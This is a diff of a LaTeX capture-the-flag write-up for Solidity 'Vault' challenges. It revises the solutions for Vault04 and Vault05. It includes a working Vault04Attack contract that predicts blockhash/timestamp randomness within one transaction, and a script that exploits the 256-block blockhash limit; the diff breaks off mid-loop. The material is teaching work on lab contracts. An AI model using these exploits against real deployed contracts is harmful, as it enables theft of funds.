@@ -141,47 +141,49 @@ contract Vault03Attack {
 \noindent
 This successfully updates \texttt{lastSolver} to the player's address, completing the challenge.
 
-\subsection*{Vault04: On the Same Block}
+\subsection*{Vault04: Pseudo-Random Trap}
 
-To breach \texttt{Vault04}, you need to provide a correct password computed using \texttt{blockhash(block.number - 1)} and \texttt{block.timestamp}. Since both values are accessible during the same transaction, you can compute the correct password on-chain and submit it immediately. Deploy the \texttt{Vault04Attack} contract, passing the vault's address as a parameter. Then, call the \texttt{attack} function from the attack contract, which computes the password and calls \texttt{breachVault()} with the correct value.
+To breach \texttt{Vault04}, you need to provide a correct guess computed using  \texttt{block.timestamp} and \texttt{blockhash(block.number - 1)}. Since both values are accessible during the same transaction, you can compute the correct guess on-chain and submit it immediately. Deploy the \texttt{Vault04Attack} contract, passing the vault's address as a parameter. Then, call the \texttt{attack} function from the attack contract, which computes the guess and calls \texttt{breachVault()} with the correct value.
 
 \begin{lstlisting}[language=Solidity]
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.28;
-
-interface IVault04 {
-    function breachVault(bytes32 _password) external returns (bool);
-}
-
-contract Vault04Attack {
-    IVault04 public vault;
-
-    constructor(address _vaultAddress) {
-        vault = IVault04(_vaultAddress);
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.28;
+    
+    interface IVault04 {
+        function breachVault(uint256 _password) external returns (bool);
     }
-
-    function attack() external returns (bool) {
-        // Compute the password using on-chain values in the same transaction
-        bytes32 password = keccak256(
-            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
-        );
-
-        // Call the breachVault function with the computed password
-        return vault.breachVault(password);
+    
+    contract Vault04Attack {
+        IVault04 public vault;
+    
+        constructor(address _vaultAddress) {
+            vault = IVault04(_vaultAddress);
+        }
+    
+        // Function to perform the attack
+        function attack() external returns (bool) {
+            // Compute the guess using on-chain values in the same transaction.
+            uint256 guess = uint256(
+                keccak256(
+                    abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+                )
+            ) % 100;
+            
+            return vault.breachVault(guess);
+        }
     }
-}
 \end{lstlisting}
 
 \noindent
-Since the password is derived from predictable on-chain data and is used within the same transaction, the attack works by ensuring the \texttt{blockhash} and \texttt{timestamp} remain valid when the vault processes the request.
+Since the guess is derived from predictable on-chain data and is used within the same transaction, the attack works by ensuring the \texttt{blockhash} and \texttt{timestamp} remain valid when the vault processes the request.
 
 \subsection*{Vault05: Fortune Teller}
 
-To breach \texttt{Vault05}, you need to use the \texttt{blockhash} of the block when the password was locked in, but only after the next block has been mined. First, you lock the password using \texttt{lockInPassword}. Then, you must wait for the next block and calculate the password using \texttt{blockhash(lockInBlockNumber)}. The issue is that at the moment of locking in the password, we do not know the blockhash yet. We can only access the blockhash of the previous blocks. However, since the \texttt{blockhash} function only returns the blockhash for the last 256 blocks, otherwise it returns zero (see \href{https://docs.soliditylang.org/en/latest/units-and-global-variables.html}{Solidity documentation}). Therefore, we simply lock in a zero hash and mine 256 blocks before calling \texttt{breachVault}  function.
+To breach \texttt{Vault05}, you need to use the \texttt{blockhash} of the block when the guess was locked in, but only after the next block has been mined. First, you lock the guess using \texttt{lockInGuess}. Then, you must wait for the next block and calculate the random number using \texttt{blockhash(lockInBlockNumber)}. The issue is that at the moment of locking in the password, we do not know the blockhash yet. We can only access the blockhash of the previous blocks. However, since the \texttt{blockhash} function only returns the blockhash for the last 256 blocks, otherwise it returns zero (see \href{https://docs.soliditylang.org/en/latest/units-and-global-variables.html}{Solidity documentation}). Therefore, we simply lock in a 0 and mine 256 blocks before calling \texttt{breachVault} function.
 
 \begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
-// Lock the zero hash
-await vault.connect(player).lockInPassword(ethers.ZeroHash);
+// Lock the zero
+await vault.connect(player).lockInGuess(0);
 
 // Mine 256 blocks
 for (let i = 0; i < 256; i++) {
